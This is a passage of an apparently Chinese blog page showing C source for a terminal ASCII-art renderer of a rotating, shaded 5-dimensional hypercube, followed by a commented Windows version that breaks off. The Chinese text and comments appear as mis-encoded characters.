class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);&#125;</span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];</span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];&#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;</span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;&#125;&#125;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++) <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                    x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                    tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                    y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                    tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                    z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                    xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                    yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];&#125;</span><br><span class="line">                tCenter[<span class="number">0</span>]/=<span class="number">3</span>;tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                            ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                        inside=<span class="number">0</span>;&#125;</span><br><span class="line">                <span class="keyword">if</span>(inside)&#123;<span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                    <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                        currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                        <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                            alpha=<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                            dis[sy][sx]=currentDis;</span><br><span class="line">                            out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);<span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);usleep(<span class="number">30000</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        è¿™ä»£ç æ˜¯ç»™äººçœ‹çš„ï¼ŸÂ¯\_(ãƒ„)_/Â¯    </div>    <div class='spoiler-content'>        <p>ç¡®å®ä¸æ˜¯ç»™ä½ çœ‹çš„ï¼Œä»¥ä¸Šä»£ç å·²ç»æŠŠæ ¼å¼å‹ç¼©åˆ°æœ€å°äº†ï¼Œåªæ˜¯çœ‹èµ·æ¥æ¯”è¾ƒå¥½çœ‹è€Œå·²ï¼Œä»¥ä¸‹æ˜¯ä»¥ä¸‹æ˜¯å¸¦æ³¨é‡Šä¸æµ‹è¯•ä»£ç çš„æºç ï¼Œè¯·åœ¨windowsä¸‹ç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55<span class="comment">//è§å¹•å¤§å°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5<span class="comment">//éå†æ–¹å—çš„æ­¥é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02<span class="comment">//ç‰©ä½“æ—‹è½¬é€Ÿåº¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001<span class="comment">//åˆ¤å®šç‚¹æ˜¯å¦åœ¨å¹³é¢å†…æ—¶çš„æ–¹ç¨‹é˜ˆå€¼</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5<span class="comment">//ç»´æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0<span class="comment">//æ˜¯å¦ä½¿ç”¨é€æ˜æè´¨ï¼ŒåŒæ—¶æ˜¯é€æ˜çš„å€ç‡ï¼Œå››ç»´æ¨è0.75ï¼Œäº”ç»´æ¨è0.6</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åæ ‡ç³»è¯´æ˜ï¼šxå‘å³ï¼Œyå‘ä¸‹ï¼Œzå‘å‰</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†åä¸€ä¸ªï¼Œä¾¿äºé€‰å–</span></span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;<span class="comment">//é€è§†æŠ•å½±æ—¶çš„å…‰æºè·ç¦»</span></span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡ï¼Œé€‰å–äº†ä¸€ä¸ªæ¯”è¾ƒèˆ’æœçš„æ‰“å…‰</span></span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;<span class="comment">//ç¡®å®šæ—‹è½¬åŸºå‡†ï¼ŒæŒ‡å®šå‚ä¸æ—‹è½¬çš„æ–¹å‘ï¼Œä¸¤ä¸ªä¸€ç»„ï¼Œä¸€ç»„ä¸­å°çš„åœ¨å‰å¤§çš„åœ¨å</span></span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">2</span> , <span class="number">1</span> &#125;;<span class="comment">//å¯¹åº”ä¸Šè¾¹çš„é…é€Ÿå€ç‡</span></span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;<span class="comment">//æ°´å¹³æ—‹è½¬ å‰åå€¾æ–œ å·¦å³å€¾æ–œï¼Œæ³¨æ„ç”¨å¼§åº¦è§’ï¼Œå¦‚ pi/4</span></span><br><span class="line"><span class="comment">/*initialObj[å·²åˆ é™¤]ï¼šæ­£æ–¹ä½“åˆå§‹æ‘†æ”¾çš„è§’åº¦ï¼›initialObjï¼šæ‘„åƒæœºåˆå§‹æ‘†æ”¾çš„è§’åº¦</span></span><br><span class="line"><span class="comment">æ—‹è½¬é¡ºåºï¼šinitialObj â†’ rotateAround â†’ initialCam</span></span><br><span class="line"><span class="comment">initialObjæ„Ÿè§‰ç”¨å¤„ä¸å¤§ï¼Œåˆ äº†ç®—äº†*/</span></span><br><span class="line"><span class="comment">/*è®¡ç®—å‘é‡æ¨¡é•¿</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line"><span class="comment">Par:</span></span><br><span class="line"><span class="comment">    vec[]ï¼šå‘é‡</span></span><br><span class="line"><span class="comment">    lenï¼šå…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="comment">--------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    COORD pos=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//å…‰æ ‡å›é›¶</span></span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›† | è®°å½•ä¸‰ç»´æŠ•å½±ååˆ°å±å¹•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹(å±å¹•å·¦ä¸Šè§’)åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span 